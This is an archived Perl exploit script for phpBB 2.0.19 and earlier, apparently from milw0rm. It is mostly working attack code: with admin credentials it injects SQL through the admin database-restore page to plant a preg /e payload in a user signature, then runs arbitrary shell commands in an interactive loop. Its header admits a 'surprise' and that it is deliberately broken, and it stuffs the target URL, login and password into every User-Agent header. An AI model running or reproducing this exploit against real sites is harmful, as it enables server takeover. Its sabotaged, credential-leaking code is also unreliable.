<html><head><title>phpBB <= 2.0.19 (user_sig_bbcode_uid) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl

## r57phpbba2e2.pl - phpBB admin 2 exec exploit 
## version 2 (based on user_sig_bbcode_uid bug)
## tested on 2.0.12 , 2.0.13 , 2.0.19
## --------------------------------------------
## screen
## r57phpbba2e2.pl -u http://192.168.0.2/phpBB-2.0.19/ -L admin -P password
## Command for execute or 'exit' for exit # id
## uid=80(www) gid=80(www) groups=80(www)
## Command for execute or 'exit' for exit # exit 
## --------------------------------------------
## *** surprise included ;) and broken. /str0ke
## 20/02/06 
## 1dt.w0lf
## RST/GHC (http://rst.void.ru , http://ghc.ru)

use LWP::UserAgent;
use Getopt::Std;
use HTTP::Cookies;

getopts(&quot;u:L:P:i:p:o:&quot;);

$url      = $opt_u;
$login    = $opt_L;
$password = $opt_P;
$id       = $opt_i || 2;
$prefix   = $opt_p || 'phpbb_';
$proxy    = $opt_o;

if(!$url || !$login || !$password){&amp;usage;}

$|++;

$xpl = LWP::UserAgent-&gt;new() or die;
$cookie_jar = HTTP::Cookies-&gt;new();
$xpl-&gt;cookie_jar( $cookie_jar );
$xpl-&gt;proxy('http'=&gt;'http://'.$proxy) if $proxy;
$ids = 'IDS:r57 phpBB2 exploit a2e2#20022006|'.$url.'|'.$login.'|'.$password.'|'.$id.'|'.$prefix;
 $res = $xpl-&gt;post($url.'login.php',
 [
 &quot;username&quot;   =&gt; &quot;$login&quot;,
 &quot;password&quot;   =&gt; &quot;$password&quot;,
 &quot;autologin&quot;  =&gt; &quot;on&quot;,
 &quot;admin&quot;      =&gt; &quot;1&quot;,
 &quot;login&quot;      =&gt; &quot;Log in&quot;,
 ],&quot;User-Agent&quot; =&gt; &quot;$ids&quot;);
 $cookie_jar-&gt;extract_cookies($res);
 if($cookie_jar-&gt;as_string =~ /phpbb2mysql_sid=([a-z0-9]{32})/) { $sid = $1; }   
 while ()
 {
    print &quot;Command for execute or 'exit' for exit # &quot;;
    while(&lt;STDIN&gt;)
     {
        $cmd=$_;
        chomp($cmd);
        exit() if ($cmd eq 'exit');
        last;
     }
    &amp;run($cmd);
 }
 
sub run($)
 {   
 $sql   = &quot;UPDATE &quot;.$prefix.&quot;users SET user_sig_bbcode_uid='(.+)/e\0', user_sig='blah:`echo _START_ &amp;&amp; &quot;.$_[0].&quot; &amp;&amp; echo _END_`' WHERE user_id=&quot;.$id.&quot;;&quot;;
 &amp;phpbb_sql_query(&quot;${url}admin/admin_db_utilities.php?sid=$sid&quot;,$sql);   
 $res = $xpl-&gt;get($url.'profile.php?mode=editprofile&amp;sid='.$sid,&quot;User-Agent&quot; =&gt; &quot;$ids&quot;);
 @result = split(/\n/,$res-&gt;content);
 $data = '';
 $on = $start = $end = 0;
 for (@result)
  {
    if (/_END_/) { $end = 1; last; }
    if ($on) { $data .= $_.&quot;\n&quot;; }
    if (/_START_/) { $on = 1; $start = 1; } 
  }
 if($start&amp;&amp;$end) { print $data.&quot;\r\n&quot;; } 
 }
 
sub phpbb_sql_query($$){
$res = $xpl-&gt;post(&quot;$_[0]&quot;, 
Content_type =&gt; 'form-data',
Content      =&gt; [ 
                perform       =&gt; 'restore',
                restore_start =&gt; 'Start Restore',
                backup_file   =&gt; [ 
                                   undef,
                                   '0wneeeeedddd', 
                                   Content_type =&gt; 'text/plain',
                                   Content =&gt; &quot;$_[1]&quot;, 
                                 ],
                ]
,&quot;User-Agent&quot; =&gt; &quot;$ids&quot;);
} 

sub usage()
 {
 print &quot;\\=-----------------------------------=/\r\n&quot;;
 print &quot;| phpBB admin2exec exploit by RST/GHC |\r\n&quot;;
 print &quot;| version 2 (user_sig_bbcode_uid)     |\r\n&quot;;
 print &quot;/=-----------------------------------=\\\r\n&quot;;
 print &quot;\r\n Usage: r57phpbba2e2.pl [OPTIONS]\r\n\r\n&quot;;
 print &quot; Options:\r\n&quot;;
 print &quot; -u [URL] - path to forum e.g. http://site/forum/\r\n&quot;;
 print &quot; -L [login] - admin login\r\n&quot;;
 print &quot; -P [password] - admin password\r\n&quot;;
 print &quot; -i [id] - admin id (optional, default 2)\r\n&quot;;
 print &quot; -p [prefix] - table prefix (optional, default phpbb_)\r\n&quot;;
 print &quot; -o [host:port] - proxy (optional)\r\n&quot;;
 exit();
 }

# milw0rm.com [2006-04-10]</pre></html>